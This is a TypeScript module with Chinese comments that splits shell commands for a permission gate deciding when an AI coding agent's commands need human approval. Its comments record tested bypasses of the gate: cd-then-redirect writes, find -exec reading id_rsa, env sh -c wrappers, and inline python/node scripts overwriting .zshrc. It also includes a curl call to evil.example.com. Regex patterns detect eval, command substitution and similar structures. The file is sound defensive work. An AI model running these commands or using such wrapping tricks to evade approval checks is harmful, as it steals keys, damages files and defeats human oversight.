/**
 * shell 命令的保守切分。
 *
 * 明确不做的事：不展开 `$(...)`、反引号、变量、别名，不解析 `eval` / `source`。
 * 凡是含这些结构的命令一律标 `unparseable`，由 decide() 判 escalate。
 * **解析不了的东西绝不自动放行**——这是本模块唯一重要的安全性质。
 */

export interface Segment {
  /** 已去引号的 argv */
  argv: readonly string[]
  program: string
  flags: readonly string[]
  /** 非 flag 的位置参数 */
  operands: readonly string[]
  /**
   * 这一段实际在哪个目录里跑。
   *
   * `cd /tmp && echo x > victim.txt` 里，`victim.txt` 相对的是 `/tmp`，
   * 不是会话的工作区。不跟踪的话判定器会算出
   * `<工作区>/victim.txt`——**一个不存在的绝对路径**，恰好落在工作区里面，
   * 于是越界红线判不到。实测：`cd /tmp && echo pwned > victim.txt` 放行，
   * 而 `printf x > ../../../etc/evil` 会问——同一件事，差别只在写法。
   *
   * `undefined` = 没 cd 过，按会话工作区解析。
   */
  cwd?: string
  /**
   * 重定向写到哪儿去（`> f`、`>> f`、`2> f`、`&> f`）。
   *
   * **这是 shell 里最常见的写文件方式，而它和程序名无关。**
   * 原来只按程序名判断写入语义（cp/mv/tee…），于是
   * `echo ok > /tmp/x` 这种在「自动编辑」档下一路放行——
   * 而那一档在界面上写的是「工作区内的改动直接放行，越界才问」。
   * 实测就是这么把 `/tmp` 里的文件写出来的，一次都没问。
   */
  redirects: readonly string[]
}

export interface SplitResult {
  segments: readonly Segment[]
  unparseable: boolean
  /** unparseable 时说明原因，会进 Verdict.reason */
  reason?: string
}

/** 会改变「实际执行什么」的结构——出现即放弃解析。 */
const OPAQUE_PATTERNS: readonly (readonly [RegExp, string])[] = [
  [/\$\(/, "命令替换 $(...)"],
  [/`/, "反引号命令替换"],
  [/(^|\s)eval(\s|$)/, "eval"],
  [/(^|\s)source(\s|$)/, "source"],
  [/(^|\s)\.\s+\S/, "点号 source"],
  [/(^|\s)exec(\s|$)/, "exec 替换进程"],
  [/<\(/, "进程替换 <(...)"],
  /*
   * ── 间接执行：**真正要跑的东西藏在参数里** ──────────────
   *
   * 这一批不是「解析不了」，是**解析了会得出错误结论**——比「不认识」更危险。
   * 实测（auto-edit，全部 allow、一次不问）：
   *
   *   find ~ -name id_rsa -exec cat {} \;      ← 去掉 -exec 那段就是 deny
   *   xargs -a list.txt rm -rf
   *   python3 -c 'import os;os.remove("/Users/x/.zshrc")'
   *   node -e 'require("fs").writeFileSync("/Users/x/.zshrc","x")'
   *
   * 分词器把引号里整段当成**一个** operand，`paths` 于是为空，
   * 所有依赖路径的红线集体失明。而 `command.ts` 开头自称的不变量是
   * 「解析不了的东西绝不自动放行」——这里恰恰是误判成能解析然后放行。
   */
  [/(^|\s)(?:find|fd)\s[\s\S]*\s-exec(?:dir)?(\s|$)/, "find -exec 间接执行"],
  [/(^|\s)xargs(\s|$)/, "xargs 间接执行"],
  [/(^|\s)(?:python3?|node|perl|ruby|php|deno|bun)\s+(?:-\S+\s+)*-(?:c|e)(\s|$)/, "解释器 -c/-e 内联脚本"],
]

/**
 * 执行器前缀：它们本身不干活，只是**换个环境去跑后面那条命令**。
 *
 * 不剥的话 `env sh -c '…'` 认不出是包壳（`SHELL_WRAPPER` 两头锚死），
 * 于是引号里整段变成一个 operand，路径红线全失明——
 * 实测 `env sh -c 'cat ~/.ssh/id_rsa'` 放行，去掉 `env` 就是 deny。
 */
const RUNNERS: ReadonlySet<string> = new Set(["env", "nohup", "nice", "timeout", "sudo", "command", "time", "stdbuf"])

/** 把开头那串执行器和它们的选项剥掉，露出真正要跑的命令。 */
function stripRunners(command: string): string {
  let text = command.trim()
  for (let i = 0; i < 4; i += 1) {
    const m = /^(\S+)\s+([\s\S]+)$/.exec(text)
    if (m === null) return text
    const head = (m[1] ?? "").split("/").pop() ?? ""
    if (!RUNNERS.has(head)) return text
    // `env FOO=1 cmd`、`timeout 5 cmd`：把不含空格的赋值/数字参数一起跳过
    let rest = m[2] ?? ""
    while (/^(?:[A-Za-z_][A-Za-z0-9_]*=\S*|-\S+|\d+(?:\.\d+)?[smhd]?)\s+/.test(rest)) {
      rest = rest.replace(/^\S+\s+/, "")
    }
    text = rest.trim()
  }
  return text
}

const SEPARATOR = /(?:&&|\|\||;|\||\n)/

/**
 * shell 包壳：`/bin/zsh -lc '真正的命令'`。
 *
 * **不剥掉的话判定器是瞎的。** codex 把每一条命令都包成这个形状，
 * 于是分词器只看到 `["/bin/zsh", "-lc", "真正的命令整串"]`：
 *
 * - 签名变成 `/bin/zsh`——勾一次「始终允许」等于放行**今后所有 shell 命令**
 * - `hosts` / `paths` 全空——「写到工作区外」「访问外部网络」这些红线
 *   对 codex 的每一条命令都失明
 *
 * 实测对照（`curl https://evil.example.com -o /etc/passwd`）：
 * 裸命令 → `hosts=["evil.example.com"] paths=["/etc/passwd"] sig=["curl"]`；
 * 包壳后 → `hosts=[] paths=[] sig=["/bin/zsh"]`。
 *
 * 放在这里而不是 codex 驱动里：任何一家用包壳的引擎都会遇到同一个问题，
 * 修在共同的解析入口上才不用每接一家补一次。
 */
/*
 * 尾部不再锚死：`sh -c '…' extra` 这种后面还跟参数的形式原来不认，
 * 于是整段落回「一个 operand」，路径红线失明。
 */
const SHELL_WRAPPER = /^\S*(?:^|\/)?(?:sh|bash|zsh|dash|ksh)\s+-[a-z]*c\s+(['"])([\s\S]*?)\1(?:\s|$)/

/** 剥掉一层包壳；不是包壳就原样返回。只剥一层——嵌套包壳本身就该人工看。 */
export function unwrapShell(command: string): string {
  const bare = stripRunners(command)
  return SHELL_WRAPPER.exec(bare)?.[2] ?? bare
}

/** 带子命令的程序——签名要带上子命令才有区分度（`git push` vs `git status`）。 */
const SUBCOMMAND_PROGRAMS: ReadonlySet<string> = new Set([
  "git", "npm", "pnpm", "yarn", "bun", "cargo", "go", "docker", "kubectl",
  "brew", "pip", "pip3", "uv", "gh", "systemctl", "launchctl",
])

function tokenize(text: string): string[] {
  const tokens: string[] = []
  const matcher = /"([^"]*)"|'([^']*)'|(\S+)/g
  for (const m of text.matchAll(matcher)) {
    tokens.push(m[1] ?? m[2] ?? m[3] ?? "")
  }
  return tokens.filter((t) => t !== "")
}

/**
 * `>`、`>>`、`2>`、`&>` 后面跟的那个目标。
 *
 * 只认**写**的重定向：`<` 是读，`>&1` / `>&2` 是复制文件描述符不是文件。
 * 认得出多少算多少——真正兜底的是 `OPAQUE_PATTERNS`（含 `$()`、`eval` 一律
 * 判为「无法静态判定」去问人）。这里做的是**把最常见的那一种从漏网里捞回来**。
 */
const REDIRECT = /(?:^|\s)(?:\d*|&)?>>?\s*("[^"]+"|'[^']+'|[^\s;|&<>]+)/g

export function redirectTargets(text: string): readonly string[] {
  const out: string[] = []
  for (const hit of text.matchAll(REDIRECT)) {
    const raw = hit[1]
    if (raw === undefined) continue
    const target = raw.replace(/^["']|["']$/g, "")
    // `>&1`、`>/dev/null` 不是要保护的东西
    if (target.startsWith("&") || target === "/dev/null" || target === "/dev/stderr") continue
    out.push(target)
  }
  return out
}

/** `cd xxx` 里那个 xxx。判不出（无参、变量、`-`）时返回 null，调用方据此整条判为不可解析。 */
function cdTarget(segment: { program: string; operands: readonly string[] }): string | null | undefined {
  if (segment.program !== "cd") return undefined
  const target = segment.operands[0]
  if (target === undefined || target === "-" || target.startsWith("$")) return null
  return target
}

function toSegment(text: string): Segment | undefined {
  const argv = tokenize(text.trim())
  const program = argv[0]
  if (program === undefined) return undefined
  return {
    argv,
    program,
    flags: argv.filter((a) => a.startsWith("-")),
    operands: argv.slice(1).filter((a) => !a.startsWith("-")),
    redirects: redirectTargets(text),
  }
}

export function splitSegments(raw: string): SplitResult {
  // 先剥壳再判：包在 `zsh -lc '...'` 里的 `$(...)` 也必须被认出来
  const command = unwrapShell(raw)
  for (const [pattern, label] of OPAQUE_PATTERNS) {
    if (pattern.test(command)) {
      return { segments: [], unparseable: true, reason: `命令含${label}，无法静态判定` }
    }
  }
  const parsed = command
    .split(SEPARATOR)
    .map(toSegment)
    .filter((s): s is Segment => s !== undefined)

  if (parsed.length === 0) {
    return { segments: [], unparseable: true, reason: "命令为空或无法切分" }
  }

  // 顺序扫一遍跟踪 `cd`：它之后各段的相对路径都按新目录算
  const segments: Segment[] = []
  let cwd: string | undefined
  for (const segment of parsed) {
    const target = cdTarget(segment)
    if (target === null) {
      return { segments: [], unparseable: true, reason: "命令里的 `cd` 目标静态判不出" }
    }
    segments.push(cwd === undefined ? segment : { ...segment, cwd })
    if (target !== undefined) cwd = target
  }
  return { segments, unparseable: false }
}

/** 归一签名，供记忆规则做模式匹配。`pnpm run test -- --watch` → `pnpm run`。 */
export function signature(segment: Segment): string {
  if (!SUBCOMMAND_PROGRAMS.has(segment.program)) return segment.program
  const sub = segment.operands[0]
  return sub === undefined ? segment.program : `${segment.program} ${sub}`
}

/** 该 segment 是否带了任一 flag（同时匹配短横线与双横线写法）。 */
export function hasFlag(segment: Segment, ...names: readonly string[]): boolean {
  return segment.flags.some((flag) =>
    names.some((name) => flag === name || (flag.startsWith("-") && !flag.startsWith("--") && name.length === 2 && flag.includes(name.slice(1)))),
  )
}
